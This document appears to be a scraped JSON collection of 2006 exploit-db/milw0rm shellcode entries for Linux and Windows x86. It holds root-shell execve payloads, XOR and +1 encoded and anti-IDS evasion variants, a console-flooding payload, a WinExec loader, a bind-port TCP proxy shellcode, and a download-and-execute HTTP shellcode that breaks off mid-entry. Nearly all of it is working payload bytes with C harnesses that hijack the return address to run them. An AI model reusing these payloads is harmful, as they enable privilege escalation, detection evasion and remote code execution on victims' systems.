{"Title": "Linux/x86 - setreuid(0, 0) + execve(/bin/sh) Shellcode (31 bytes)", "Author": "izik", "Published": ": 2006-01-21", "Platform": "Linux_x86", "Download": "https://old.exploit-db.com/download/13398.c", "View": "https://old.exploit-db.com/raw/13398/", "code": ["/*", " * (linux/x86) setreuid(0, 0) + execve(\"/bin/sh\", [\"/bin/sh\", NULL], NULL) - 31 bytes", " * - izik <izik@tty64.org>", " */", "", "char shellcode[] = ", "", "\t\"\\x6a\\x46\"              // push $0x46 ", "\t\"\\x58\"                  // pop %eax ", "\t\"\\x31\\xdb\"              // xor %ebx,%ebx ", "\t\"\\x31\\xc9\"              // xor %ecx,%ecx ", "\t\"\\xcd\\x80\"              // int $0x80 ", "\t\"\\x99\"                  // cltd ", "\t\"\\xb0\\x0b\"              // mov $0xb,%al ", "\t\"\\x52\"                  // push %edx ", "\t\"\\x68\\x2f\\x2f\\x73\\x68\"  // push $0x68732f2f ", "\t\"\\x68\\x2f\\x62\\x69\\x6e\"  // push $0x6e69622f ", "\t\"\\x89\\xe3\"              // mov %esp,%ebx ", "\t\"\\x52\"                  // push %edx ", "\t\"\\x53\"                  // push %ebx ", "\t\"\\x89\\xe1\"              // mov %esp,%ecx ", "\t\"\\xcd\\x80\";             // int $0x80 ", "", "int main(int argc, char **argv) {", "\tint *ret;", "\tret = (int *)&ret + 2;", "\t(*ret) = (int) shellcode;", "}", "", "// milw0rm.com [2006-01-21]"]},
{"Title": "Linux/x86 - execve(/bin/sh) + PUSH Shellcode (23 bytes)", "Author": "izik", "Published": ": 2006-01-21", "Platform": "Linux_x86", "Download": "https://old.exploit-db.com/download/13399.c", "View": "https://old.exploit-db.com/raw/13399/", "code": ["/*", " * (linux/x86) execve(\"/bin/sh\", [\"/bin/sh\", NULL]) / PUSH - 23 bytes", " * - izik <izik@tty64.org>", " */", "", "char shellcode[] = ", "", "\t\"\\x6a\\x0b\"              // push $0xb ", "\t\"\\x58\"                  // pop %eax ", "\t\"\\x99\"                  // cltd ", "\t\"\\x52\"                  // push %edx ", "\t\"\\x68\\x2f\\x2f\\x73\\x68\"  // push $0x68732f2f ", "\t\"\\x68\\x2f\\x62\\x69\\x6e\"  // push $0x6e69622f ", "\t\"\\x89\\xe3\"              // mov %esp,%ebx ", "\t\"\\x52\"                  // push %edx ", "\t\"\\x53\"                  // push %ebx ", "\t\"\\x89\\xe1\"              // mov %esp,%ecx ", "\t\"\\xcd\\x80\";             // int $0x80 ", "", "int main(int argc, char **argv) {", "\tint *ret;", "\tret = (int *)&ret + 2;", "\t(*ret) = (int) shellcode;", "}", "", "// milw0rm.com [2006-01-21]"]},
{"Title": "Linux/x86 - cat /dev/urandom > /dev/console Shellcode (63 bytes)", "Author": "izik", "Published": ": 2006-01-21", "Platform": "Linux_x86", "Download": "http://shell-storm.org/shellcode/files/shellcode-234.php", "View": null, "code": ["/*", " * (linux/x86) cat /dev/urandom > /dev/console, no real profit just for kicks - 63 bytes", " * - izik <izik@tty64.org>", " */", "", "char shellcode[] = ", "", "\t\"\\x31\\xc9\"              // xor %ecx,%ecx ", "\t\"\\x51\"                  // push %ecx ", "\t\"\\x68\\x6e\\x64\\x6f\\x6d\"  // push $0x6d6f646e ", "\t\"\\x68\\x2f\\x75\\x72\\x61\"  // push $0x6172752f ", "\t\"\\x68\\x2f\\x64\\x65\\x76\"  // push $0x7665642f ", "\t\"\\x89\\xe3\"              // mov %esp,%ebx ", "\t\"\\xb1\\x02\"              // mov $0x2,%cl ", "", "\t//", "\t// <_openit>:", "\t//", "", "\t\"\\x6a\\x05\"              // push $0x5 ", "\t\"\\x58\"                  // pop %eax ", "\t\"\\x99\"                  // cltd ", "\t\"\\xcd\\x80\"              // int $0x80 ", "\t\"\\x96\"                  // xchg %eax,%esi ", "\t\"\\x5f\"                  // pop %edi ", "\t\"\\x5d\"                  // pop %ebp ", "\t\"\\x5d\"                  // pop %ebp ", "\t\"\\x68\\x73\\x6f\\x6c\\x65\"  // push $0x656c6f73 ", "\t\"\\x68\\x2f\\x63\\x6f\\x6e\"  // push $0x6e6f632f ", "\t\"\\x57\"                  // push %edi ", "\t\"\\xe2\\xe9\"              // loop <_openit>", " ", "\t\"\\x89\\xc3\"              // mov %eax,%ebx ", "", "\t//", "\t// <_makeio>:", "\t//", "", "\t\"\\xb2\\x04\"              // mov $0x4,%dl ", "\t\"\\x89\\xe1\"              // mov %esp,%ecx ", "", "\t//", "\t// <_pre_ioloop>:", "\t//", "", "\t\"\\xb0\\x03\"              // mov $0x3,%al ", "\t\"\\xf8\"                  // clc ", "\t", "\t//", "\t// <_ioloop>:", "\t//", "", "\t\"\\xcd\\x80\"              // int $0x80 ", "\t\"\\x87\\xde\"              // xchg %ebx,%esi ", "\t\"\\x72\\xf7\"              // jc <_pre_ioloop> ", "\t\"\\xf9\"                  // stc ", "\t\"\\xeb\\xf7\";             // jmp <_ioloop> ", "", "int main(int argc, char **argv) {", "\tint *ret;", "\tret = (int *)&ret + 2;", "\t(*ret) = (int) shellcode;", "}", "", "// milw0rm.com [2006-01-21]"]},
{"Title": "Windows/x86 (XP SP2) - MessageBox Shellcode (110 bytes)", "Author": "Omega7", "Published": ": 2006-01-24", "Platform": "Windows_x86", "Download": "http://shell-storm.org/shellcode/files/shellcode-161.php", "View": null, "code": ["/*", "Author : Omega7", "Assembly Code : Steve Hanna", "Changed by : Omega7", "Description : It is 110 Byte Shellcode which Pops up Message Box Under Windows Xp SP2", "If you Want to use it in any other Windows You need to change the address", "that i have marked!", "", "*/", "", "#include <stdlib.h>", "#include <string.h>", "", "char shellcode[]=", "\"\\x31\\xc0\\x31\\xdb\\x31\\xc9\\x31\\xd2\\xeb\\x37\\x59\\x88\\x51\\x0a\\xbb\"", "\"\\x77\\x1d\\x80\\x7c\"    //***LoadLibraryA(libraryname) IN WinXP sp2***", "\"\\x51\\xff\\xd3\\xeb\\x39\\x59\\x31\\xd2\\x88\\x51\\x0b\\x51\\x50\\xbb\"", "\"\\x28\\xac\\x80\\x7c\"   //***GetProcAddress(hmodule,functionname) IN sp2***", "\"\\xff\\xd3\\xeb\\x39\\x59\\x31\\xd2\\x88\\x51\\x06\\x31\\xd2\\x52\\x51\"", "\"\\x51\\x52\\xff\\xd0\\x31\\xd2\\x50\\xb8\\xa2\\xca\\x81\\x7c\\xff\\xd0\\xe8\\xc4\\xff\"", "\"\\xff\\xff\\x75\\x73\\x65\\x72\\x33\\x32\\x2e\\x64\\x6c\\x6c\\x4e\\xe8\\xc2\\xff\\xff\"", "\"\\xff\\x4d\\x65\\x73\\x73\\x61\\x67\\x65\\x42\\x6f\\x78\\x41\\x4e\\xe8\\xc2\\xff\\xff\"", "\"\\xff\\x4f\\x6d\\x65\\x67\\x61\\x37\\x4e\";", "", "/*MessageBox shellcode for Windoew xp sp2 */", "", "int main ()", "{", "int *ret;", "ret=(int *)&ret+2;", "printf(\"Shellcode Length is : %d\",strlen(shellcode));", "(*ret)=(int)shellcode;", "return 0;", "}", "", "// milw0rm.com [2006-01-24]"]},
{"Title": "Windows/x86 - Command WinExec() Shellcode (104+ bytes)", "Author": "Weiss", "Published": ": 2006-01-24", "Platform": "Windows_x86", "Download": "http://shell-storm.org/shellcode/files/shellcode-391.php", "View": null, "code": [";", "; relocateable dynamic runtime assembly code example using hash lookup", ";", "; WinExec() with ExitThread()", "; 104 bytes", ";", "; for testing:", ";", "; ml /c /coff /Cp wexec2.asm", "; link /subsystem:windows /section:.text,w wexec2.obj", ";", "; wyse101 [at] gmail.com", ";", "; October 2006", ";", ".386", ".model flat,stdcall", "", "ROL_CONSTANT equ 5", "", "mrol macro iNum:req,iBits:req", "   exitm <(iNum shl iBits) or (iNum shr (32-iBits))>", "endm", "", "mror macro iNum:req,iBits:req", "   exitm <(iNum shr iBits) or (iNum shl (32-iBits))>", "endm", "", "hashapi macro szApi", "   local dwApi", "", "   dwApi = 0", "", "   forc x,szApi", "      dwApi = dwApi + '&x'", "      dwApi = mrol(dwApi,ROL_CONSTANT)", "   endm", "   dwApi = mrol(dwApi,ROL_CONSTANT)", "   dw (dwApi and 0ffffh)", "endm", "", ".code", "", "   assume fs:nothing", "", "code_start:", "   jmp load_data", "setup_parameters:", "   pop ebp", "   xor ecx,ecx", "   push ecx                                 ; ExitThread() exitcode", "   push ecx                                 ; SW_HIDE", "   mov cl,(cmd_end-api_hashes)              ; limit of 255 bytes per command", "   inc byte ptr[ebp+ecx]", "   lea eax,[ebp+(cmd_string-api_hashes)]", "   push eax                                 ; WinExec command string", "get_k32_base:", "   mov cl,30h", "   mov eax,fs:[ecx]", "   mov eax,[eax+0ch]", "   mov esi,[eax+1ch]", "   lodsd", "   mov ebx,[eax+08h]", "get_api_loop:", "   mov eax,[ebx+3ch]", "   mov eax,[ebx+eax+78h]", "   lea esi,[ebx+eax+1ch]", "   mov cl,3", "load_rva:", "   lodsd", "   add eax,ebx", "   push eax", "   loop load_rva", "   pop ebp", "   pop edi", "load_api:", "   mov esi,[edi+4*ecx]", "   add esi,ebx", "   xor eax,eax", "   cdq", "hash_api:", "   lodsb", "   add edx,eax", "   rol edx,ROL_CONSTANT", "   dec eax", "   jns hash_api", "   inc ecx", "   mov eax,[esp+4]", "   cmp dx,word ptr[eax]", "   jne load_api", "   pop eax", "   movzx edx,word ptr[ebp+2*ecx-2]", "   add ebx,[eax+4*edx]", "   pop esi", "   call ebx", "   lodsw", "   jmp get_k32_base", "load_data:", "   call setup_parameters", "api_hashes:", "   hashapi <WinExec>", "   hashapi <ExitThread>", "code_end:", "", "cmd_string db 'cmd /c echo hello,world>test.txt && notepad test.txt',0ffh", "cmd_end equ $-1", "", "end code_start", "", "; milw0rm.com [2006-01-24]"]},
{"Title": "Linux/x86 (Intel x86 CPUID) - execve(/bin/sh) + XORED Encoded Shellcode (41 bytes)", "Author": "izik", "Published": ": 2006-01-25", "Platform": "Linux_x86", "Download": "http://shell-storm.org/shellcode/files/shellcode-228.php", "View": null, "code": ["/*", " * (linux/x86) execve(\"/bin/sh\", [\"/bin/sh\"], NULL) / xor'ed against Intel x86 CPUID - 41 bytes", " *", " * The idea behind this shellcode is to use a *weak* pre-shared secret between the attacker and", " * the attacked machine. So if a 3rd party side would try to run this shellcode and would produce ", " * a different CPUID output (e.g. different arch) the shellcode won't work. In addition this also", " * prevents from having the '/bin/sh' string visible on the wire.", " *", " * The shellcode key is (0x6c65746e, 'letn') and expected to be in %ecx register after CPUID", " * ", " * - izik <izik@tty64.org>", " */", "", "char shellcode[] = ", "", "\t\"\\x31\\xc0\"              // xor %eax,%eax ", "\t\"\\x0f\\xa2\"              // cpuid ", "\t\"\\x51\"                  // push %ecx ", "\t\"\\x68\\xe7\\x95\\xa8\\xec\"  // push $0xeca895e7 ", "\t\"\\x68\\xde\\x7f\\x37\\x3f\"  // push $0x3f377fde ", "\t\"\\x68\\x07\\x1a\\xec\\x8f\"  // push $0x8fec1a07 ", "\t\"\\x68\\x6e\\x1c\\x4a\\x0e\"  // push $0x0e4a1c6e ", "\t\"\\x68\\x06\\x5b\\x16\\x04\"  // push $0x04165b06 ", "", "\t//", "\t// <_unpack_loop>:", "\t//", "", "\t\"\\x31\\x0c\\x24\"          // xor %ecx,(%esp) ", "\t\"\\x5a\"                  // pop %edx ", "\t\"\\x75\\xfa\"              // jne <_unpack_loop> ", "\t\"\\x83\\xec\\x18\"          // sub $0x18,%esp ", "\t\"\\x54\"                  // push %esp ", "\t\"\\xc3\";                 // ret ", "", "int main(int argc, char **argv) {", "\tint *ret;", "\tret = (int *)&ret + 2;", "\t(*ret) = (int) shellcode;", "}", "", "// milw0rm.com [2006-01-25]"]},
{"Title": "Linux/x86 - execve(/bin/sh) Shellcode + 1 Encoded (39 bytes)", "Author": "izik", "Published": ": 2006-01-25", "Platform": "Linux_x86", "Download": "http://shell-storm.org/shellcode/files/shellcode-229.php", "View": null, "code": ["/*", " * (linux/x86) - execve(\"/bin/sh\", [\"/bin/sh\"], NULL) / encoded by +1 - 39 bytes", " * - izik <izik@tty64.org>", " */", "", "char shellcode[] = ", "", "\t\"\\x68\\x8a\\xe2\\xce\\x81\"  // push $0x81cee28a ", "\t\"\\x68\\xb1\\x0c\\x53\\x54\"  // push $0x54530cb1 ", "\t\"\\x68\\x6a\\x6f\\x8a\\xe4\"  // push $0xe48a6f6a ", "\t\"\\x68\\x01\\x69\\x30\\x63\"  // push $0x63306901 ", "\t\"\\x68\\x69\\x30\\x74\\x69\"  // push $0x69743069 ", "\t\"\\x6a\\x14\"              // push $0x14 ", "\t\"\\x59\"                  // pop %ecx ", "\t", "\t//", "\t// <_unpack_loop>:", "\t//", "", "\t\"\\xfe\\x0c\\x0c\"          // decb (%esp,%ecx,1) ", "\t\"\\x49\"                  // dec %ecx ", "\t\"\\x79\\xfa\"              // jns <_unpack_loop> ", "\t\"\\x41\"                  // inc %ecx ", "\t\"\\xf7\\xe1\"              // mul %ecx ", "\t\"\\x54\"                  // push %esp ", "\t\"\\xc3\";                 // ret ", "", "int main(int argc, char **argv) {", "\tint *ret;", "\tret = (int *)&ret + 2;", "\t(*ret) = (int) shellcode;", "}", "", "// milw0rm.com [2006-01-25]"]},
{"Title": "Linux/x86 - execve(/bin/sh) + Anti-IDS Shellcode (40 bytes)", "Author": "NicatiN", "Published": ": 2006-01-26", "Platform": "Linux_x86", "Download": "http://shell-storm.org/shellcode/files/shellcode-256.php", "View": null, "code": ["/*", "[N] Shell : shellcodez", "", "Arch:x86", "Platform:linux", "Size:40", "Description:", "The shellcode to execute /bin/sh;", "This shellcode is anti-ids", "It not containz encoding engine but it", "not contain standart signatures as:", "\t\"\\xcd\\x80\"", "\t'\\bin\\sh'", "Tested on Slackware 10.0", "", "Coded by [NicatiN]", "http://nshell.h15.ru", "n_shell@mail.ru", "", "", "source:", "cdq", "push edx", "pop eax", "push edx", "mov edi,876189623", "add edi,edi", "push edi", "mov edi,884021143", "add edi,edi", "inc edi", "push edi", "mov ebx,esp", "push edx", "push ebx", "mov ecx,esp", "mov al,99", "sub al,88", "sub edi,1768009314", "push edi", "call esp", "", "dizasm:", "8048080:       99                      cltd", "8048081:       52                      push   %edx", "8048082:       58                      pop    %eax", "8048083:       52                      push   %edx", "8048084:       bf b7 97 39 34          mov    $0x343997b7,%edi", "8048089:       01 ff                   add    %edi,%edi", "804808b:       57                      push   %edi", "804808c:       bf 97 17 b1 34          mov    $0x34b11797,%edi", "8048091:       01 ff                   add    %edi,%edi", "8048093:       47                      inc    %edi", "8048094:       57                      push   %edi", "8048095:       89 e3                   mov    %esp,%ebx", "8048097:       52                      push   %edx", "8048098:       53                      push   %ebx", "8048099:       89 e1                   mov    %esp,%ecx", "804809b:       b0 63                   mov    $0x63,%al", "804809d:       2c 58                   sub    $0x58,%al", "804809f:       81 ef 62 ae 61 69       sub    $0x6961ae62,%edi", "80480a5:       57                      push   %edi", "80480a6:       ff d4                   call   *%esp", "", "*/", "", "char sc[]=", "\"\\x99\\x52\\x58\\x52\\xbf\\xb7\\x97\\x39\\x34\\x01\\xff\\x57\\xbf\\x97\\x17\\xb1\"", "\"\\x34\\x01\\xff\\x47\\x57\\x89\\xe3\\x52\\x53\\x89\\xe1\\xb0\\x63\\x2c\\x58\\x81\"", "\"\\xef\\x62\\xae\\x61\\x69\\x57\\xff\\xd4\";", "", "int main()", "{", "\tint (*f)() = (int (*)())sc;", "\tf();", "}", "", "// milw0rm.com [2006-01-26]"]},
{"Title": "Linux/x86 - TCP Proxy (192.168.1.16:1280/TCP) All Connect() + Null-Free Shellcode (236 bytes)", "Author": "phar", "Published": ": 2006-02-07", "Platform": "Linux_x86", "Download": "https://old.exploit-db.com/download/13381.c", "View": "https://old.exploit-db.com/raw/13381/", "code": ["// proxylib.c - is located at http://www.milw0rm.com/id.php?id=1476 /str0ke", "", "/********************************************************************", "", " hey all.. this is my attempt at a very small very functional tcp ", " proxy shellcode.. to pull this off i ignored the \"socks\" protocols", " and invented my own.. sorta..", "", " how to use me..", " ", " deliver shellcode however you would normally deliver shellcode to a", " machine, lets say 192.168.1.1 in this case..", " ", " on your machine you would setup the proxy library like so:", "", " phar@hatless-cat ~/proxyshell $  gcc -c -o proxyshell_connect.o proxylib.c -fpic", " phar@hatless-cat ~/proxyshell $  ld -shared -o proxyshell_connect.so proxyshell_connect.o -ldl", " phar@hatless-cat ~/proxyshell $  export LD_PRELOAD=/full/path/to/proxyshell_connect.so", " phar@hatless-cat ~/proxyshell $  export SHELLPROXYHOST=192.168.1.16:1280", "", "", " from now on any calls to connect() will be proxied through the shellcode ", " which can handle multiple simultanious connections to arbitrary hosts.", "", " by default the shell binds to port 1280, you can easily modify which ", " the host binds to by finding the code labeled \"port info\" like this", "", "        \"\\xba\\xfd\\xff\\xfa\\xff\"          // mov    $0xfffafffd,%edx      ;port info", "\t", "\tinvert the last for bytes (logical NOT) and you'll see where port", "\t0x5000 is declared.. adjust to whatever port you want, and reinvert..", "", "", " proxylib.c should be available at stonedcoder.org", "", " one last note about proxylib.c, it does not handle dns resolution properly, ", " so ip addresses only.. unless you know.. you feel like making it work..", "", "", "", " phar[at]stonedcoder[dot]org", "\thttp://www.stonedcoder.org", "\thttp://bpp.etherdyne.net", "********************************************************************/", "", "", "", "char shellcode[] = {", "//main:", "\t\"\\x31\\xc0\"\t\t\t// xor    %eax,%eax", "\t\"\\x89\\xc3\"\t\t\t// mov    %eax,%ebx", "\t\"\\x50\"\t\t\t\t// push   %eax", "\t\"\\x40\"\t\t\t\t// inc    %eax", "\t\"\\x50\"\t\t\t\t// push   %eax", "\t\"\\x40\"\t\t\t\t// inc    %eax", "\t\"\\x50\"\t\t\t\t// push   %eax", "\t\"\\x89\\xe1\"\t\t\t// mov    %esp,%ecx", "\t\"\\xb0\\x66\"\t\t\t// mov    $0x66,%al", "\t\"\\x89\\xc7\"\t\t\t// mov    %eax,%edi", "\t\"\\x43\"\t\t\t\t// inc    %ebx", "\t\"\\xcd\\x80\"\t\t\t// int    $0x80\t\t\t;socket", "", "\t\"\\x89\\xc6\"\t\t\t// mov    %eax,%esi", "\t\"\\x89\\xf8\"\t\t\t// mov    %edi,%eax", "\t\"\\x31\\xd2\"\t\t\t// xor    %edx,%edx", "\t\"\\x52\"\t\t\t\t// push   %edx", "\t\"\\x52\"\t\t\t\t// push   %edx", "\t\"\\x52\"\t\t\t\t// push   %edx", "\t\"\\xba\\xfd\\xff\\xfa\\xff\" \t\t// mov    $0xfffafffd,%edx\t;port info", "\t\"\\xf7\\xd2\"\t\t\t// not    %edx", "\t\"\\x52\"\t\t\t\t// push   %edx", "\t\"\\x89\\xe1\"\t\t\t// mov    %esp,%ecx", "\t\"\\x31\\xd2\"\t\t\t// xor    %edx,%edx", "\t\"\\xb2\\x10\"\t\t\t// mov    $0x10,%dl", "\t\"\\x52\"\t\t\t\t// push   %edx", "\t\"\\x51\"\t\t\t\t// push   %ecx", "\t\"\\x56\"\t\t\t\t// push   %esi", "\t\"\\x89\\xe1\"\t\t\t// mov    %esp,%ecx", "\t\"\\x43\"\t\t\t\t// inc    %ebx", "\t\"\\xcd\\x80\"\t\t\t// int    $0x80\t\t\t;bind", "", "\t\"\\x53\"\t\t\t\t// push   %ebx", "\t\"\\x56\"\t\t\t\t// push   %esi", "\t\"\\x89\\xe1\"\t\t\t// mov    %esp,%ecx", "\t\"\\xb0\\x66\"\t\t\t// mov    $0x66,%al", "\t\"\\xb3\\x04\"\t\t\t// mov    $0x4,%bl", "\t\"\\xcd\\x80\"\t\t\t// int    $0x80\t\t\t;listen", "", "\t\"\\x31\\xc9\"\t\t\t// xor    %ecx,%ecx", "\t\"\\x41\"\t\t\t\t// inc    %ecx", "\t\"\\xb3\\x11\"\t\t\t// mov    $0x11,%bl", "\t\"\\xb0\\x30\"\t\t\t// mov    $0x30,%al", "\t\"\\xcd\\x80\"\t\t\t// int    $0x80\t\t\t;signal", "", "//do_next_accept:", "\t\"\\x31\\xc0\"\t\t\t// xor    %eax,%eax", "\t\"\\x50\"\t\t\t\t// push   %eax", "\t\"\\x50\"\t\t\t\t// push   %eax", "\t\"\\x56\"\t\t\t\t// push   %esi", "\t\"\\x89\\xe1\"\t\t\t// mov    %esp,%ecx", "\t\"\\xb0\\x66\"\t\t\t// mov    $0x66,%al", "\t\"\\x89\\xc2\"\t\t\t// mov    %eax,%edx", "\t\"\\xb3\\x05\"\t\t\t// mov    $0x5,%bl", "\t\"\\xcd\\x80\"\t\t\t// int    $0x80\t\t\t;accept", "", "\t\"\\x89\\xc7\"\t\t\t// mov    %eax,%edi", "\t\"\\x31\\xc0\"\t\t\t// xor    %eax,%eax", "\t\"\\x50\"\t\t\t\t// push   %eax", "\t\"\\x40\"\t\t\t\t// inc    %eax", "\t\"\\x50\"\t\t\t\t// push   %eax", "\t\"\\x40\"\t\t\t\t// inc    %eax", "\t\"\\x50\"\t\t\t\t// push   %eax", "\t\"\\xcd\\x80\"\t\t\t// int    $0x80\t\t\t;fork", "", "\t\"\\x85\\xc0\"\t\t\t// test   %eax,%eax", "\t\"\\x75\\xe2\"\t\t\t// jne    8048398 <do_next_accept>", "\t\"\\x89\\xe1\"\t\t\t// mov    %esp,%ecx", "\t\"\\xb0\\x66\"\t\t\t// mov    $0x66,%al", "\t\"\\x89\\xc3\"\t\t\t// mov    %eax,%ebx", "\t\"\\xb3\\x01\"\t\t\t// mov    $0x1,%bl", "\t\"\\xcd\\x80\"\t\t\t// int    $0x80\t\t\t;socket", "", "\t\"\\x89\\xc6\"\t\t\t// mov    %eax,%esi", "\t\"\\xb0\\x10\"\t\t\t// mov    $0x10,%al", "\t\"\\x29\\xc4\"\t\t\t// sub    %eax,%esp", "\t\"\\x89\\xe1\"\t\t\t// mov    %esp,%ecx", "\t\"\\x31\\xc0\"\t\t\t// xor    %eax,%eax", "\t\"\\x50\"\t\t\t\t// push   %eax", "\t\"\\x52\"\t\t\t\t// push   %edx", "\t\"\\x51\"\t\t\t\t// push   %ecx", "\t\"\\x57\"\t\t\t\t// push   %edi", "\t\"\\x89\\xe1\"\t\t\t// mov    %esp,%ecx", "\t\"\\xb0\\x66\"\t\t\t// mov    $0x66,%al", "\t\"\\xb3\\x0a\"\t\t\t// mov    $0xa,%bl", "\t\"\\xcd\\x80\"\t\t\t// int    $0x80\t\t\t;recv", "", "", "\t\"\\xb0\\x66\"\t\t\t// mov    $0x66,%al", "\t\"\\xb3\\x03\"\t\t\t// mov    $0x3,%bl", "\t\"\\x89\\x34\\x24\"\t\t\t// mov    %esi,(%esp)", "\t\"\\xcd\\x80\"\t\t\t// int    $0x80", "\t\"\\x85\\xc0\"\t\t\t// test   %eax,%eax", "\t\"\\x74\\x14\"\t\t\t// jz     ready_to_proxy", "", "//close:", "\t\"\\x89\\xf3\"\t\t\t// mov    %esi,%ebx", "\t\"\\x31\\xc0\"\t\t\t// xor    %eax,%eax", "\t\"\\xb0\\x06\"\t\t\t// mov    $0x6,%al", "\t\"\\xcd\\x80\"\t\t\t// int    $0x80\t\t\t;close", "", "\t\"\\x87\\xf7\"\t\t\t// xchg   %esi,%edi", "\t\"\\x85\\xc0\"\t\t\t// test   %eax,%eax", "\t\"\\x74\\xf\"\t\t\t// jz     close", "", "//exit:", "\t\"\\x31\\xc0\"\t\t\t// xor    %eax,%eax", "\t\"\\xb0\\x01\"\t\t\t// mov    $0x1,%al", "\t\"\\xcd\\x80\"\t\t\t// int    $0x80\t\t\t;recv", "", "//ready_to_proxy:", "\t\"\\x31\\xdb\"\t\t\t// xor    %ebx,%ebx", "\t\"\\xb3\\x10\"\t\t\t// mov    $0x10,%bl", "\t\"\\x01\\xdc\"\t\t\t// add    %ebx,%esp", "\t\"\\x87\\xf7\"\t\t\t// xchg   %esi,%edi", "\t\"\\x31\\xc0\"\t\t\t// xor    %eax,%eax", "\t\"\\x50\"\t\t\t\t// push   %eax", "\t\"\\x56\"\t\t\t\t// push   %esi", "\t\"\\x89\\xe3\"\t\t\t// mov    %esp,%ebx", "\t\"\\x31\\xc9\"\t\t\t// xor    %ecx,%ecx", "\t\"\\x41\"\t\t\t\t// inc    %ecx", "\t\"\\x89\\xca\"\t\t\t// mov    %ecx,%edx", "\t\"\\xb0\\xa8\"\t\t\t// mov    $0xa8,%al", "\t\"\\xcd\\x80\"\t\t\t// int    $0x80\t\t\t;connect", "", "\t\"\\x31\\xc0\"\t\t\t// xor    %eax,%eax", "\t\"\\xb0\\x40\"\t\t\t// mov    $0x40,%al", "\t\"\\x89\\xe2\"\t\t\t// mov    %esp,%edx", "\t\"\\x50\"\t\t\t\t// push   %eax", "\t\"\\xb0\\x08\"\t\t\t// mov    $0x8,%al", "\t\"\\x50\"\t\t\t\t// push   %eax", "\t\"\\x52\"\t\t\t\t// push   %edx", "\t\"\\x56\"\t\t\t\t// push   %esi", "\t\"\\x89\\xe1\"\t\t\t// mov    %esp,%ecx", "\t\"\\x31\\xdb\"\t\t\t// xor    %ebx,%ebx", "\t\"\\xb3\\x0a\"\t\t\t// mov    $0xa,%bl", "", "//do_next_proxy:,", "\t\"\\x31\\xc0\"\t\t\t// xor    %eax,%eax", "\t\"\\xb0\\x66\"\t\t\t// mov    $0x66,%al", "\t\"\\xcd\\x80\"\t\t\t// int    $0x80\t\t\t;send/recv", "\t\"\\x85\\xc0\"\t\t\t// test   %eax,%eax", "\t\"\\x74\\xb9\"\t\t\t// jz     close", "\t\"\\x89\\xda\"\t\t\t// mov    %ebx,%edx", "\t\"\\xf6\\xc2\\x01\"\t\t\t// test   $0x1,%dl", "\t\"\\x75\\xc6\"\t\t\t// jnz    ready_to_proxy", "", "//is_recv_call:", "\t\"\\x89\\xc2\"\t\t\t// mov    %eax,%edx", "\t\"\\xd1\\xe2\"\t\t\t// shl    %edx", "\t\"\\x72\\xc0\"\t\t\t// jb     ready_to_proxy", "\t\"\\x89\\x41\\x08\"\t\t\t// mov    %eax,0x8(%ecx)", "\t\"\\x89\\x39\"\t\t\t// mov    %edi,(%ecx)", "\t\"\\x4b\"\t\t\t\t// dec    %ebx", "\t\"\\xeb\\xe1\"\t\t\t// jmp    do_next_proxy", "};", "", "", "int main() {", "int *ret;", "char cnull = 0;", "", "        printf(\"shellcode_size: %u\\n\", sizeof(shellcode));", "        printf(\"contains nulls: \");", "        if(!memmem(shellcode,sizeof(shellcode),&cnull,1)){", "                printf(\"yes\\n\");", "        }else{", "                printf(\"no\\n\");", "        }", "", "        ret = (int *)&ret + 2;", "        (*ret) = (int)shellcode;", "", "}", "", "// milw0rm.com [2006-02-07]"]}
]

const pag_4 = [{"Title": "Linux/x86 - Download File (HTTP/1.x http://127.0.0.1:8081/foobar.bin) + Receive Shellcode + Payload Loader Shellcode (68+ bytes)", "Author": "izik", "Published": ": 2006-03-12", "Platform": "Linux_x86", "Download": "http://shell-storm.org/shellcode/files/shellcode-227.php", "View": null, "code": ["/* (linux/x86) HTTP/1.x GET, Downloads and JMP - 68 bytes+", " *", " * This shellcode allows you to download a binary code straight off a standard HTTP server", " * and execute it. The downloaded shellcode (e.g. binary code) will be executed on the stack.", " *", " * <DEMONSTRATION>:", " *", " * > Starting by creating a very simple shellcode, that will be downloaded and execute.", " * ", " * root@magicbox:/tmp# cat foobar.s", " *\t.section .text", " *      .global _start", " *      _start:", " *", " *\t\tmovl $0x4, %eax", " *              movl $0x1, %ebx", " *", " *              call _doint", " *                      .ascii \"Hello World!\"", " *\t\t\t.byte 0xa", " *              _doint:", " *              popl %ecx", " *              movl $0xd, %edx", " *              int $0x80", " *", " *              movl $0x1, %eax", " *              int $0x80", " *", " *\t\t# Reverse CALL", " *              call _start", " *", " * > The only requirement from the downloaded shellcode, is that it will include a reverse ", " *   CALL to itself. As this shellcode does not parse the HTTP header, it has no way to know ", " *   where the downloaded shellcode begins or ends. Therefor it realys on the downloaded ", " *   shellcode to supply that, by including a CALL in the bottom, which will be JMP into.", " *", " * > Compile the given shellcode ", " *", " * root@magicbox:/tmp# as -o foobar.o foobar.s", " * root@magicbox:/tmp# ld -o foobar foobar.o", " *", " * > Convert this file into a raw binary (headerless, formatless)", " *", " * root@magicbox:/tmp# objcopy -O binary foobar foobar.bin", " *", " * > Host this file, on some HTTP server (I haved used Apache/1.3.34)", " *", " * > Use gen_httpreq.c to generate a URL request (e.g. /foobar.bin)", " *", " * > Paste the gen_httpreq.c output, into this shellcode at the marked place.", " *", " * > Compile this shellcode w/ the gen_httpreq output in it.", " *", " * > Execute this shellcode", " * ", " * root@magicbox:/tmp# gcc -o http-download-jmp http-download-jmp.c", " * root@magicbox:/tmp# ./http-download-jmp", " * Hello World!", " * root@magicbox:/tmp#", " *", " * <LINKS/UTILITIES>:", " *", " *      gen_httpreq.c, generates a HTTP GET request for this shellcode", " *      > http://www.tty64.org/shellcode/utilities/gen_httpreq.c", " *", " * - izik <izik@tty64.org>", " */", "", "char shellcode[] = ", "", "\t\"\\x6a\\x66\"              // push $0x66 ", "\t\"\\x58\"                  // pop %eax ", "\t\"\\x99\"                  // cltd ", "\t\"\\x6a\\x01\"              // push $0x1 ", "\t\"\\x5b\"                  // pop %ebx ", "\t\"\\x52\"                  // push %edx ", "\t\"\\x53\"                  // push %ebx ", "\t\"\\x6a\\x02\"              // push $0x2 ", "\t\"\\x89\\xe1\"              // mov %esp,%ecx ", "\t\"\\xcd\\x80\"              // int $0x80 ", "\t\"\\x5b\"                  // pop %ebx ", "\t\"\\x5d\"                  // pop %ebp ", "", "\t\t\t\t//", "\t\"\\xbe\\x80\\xff\\xff\\xfe\"  // mov $0xfeffff80,%esi ", "\t\t\t\t// (0x0xfeffff80 = ~127.0.0.1)", "\t\t\t\t//", "", "\t\t\t\t//", "\t\"\\x66\\xbd\\x91\\x1f\"      // mov $0x1f91,%bp ", 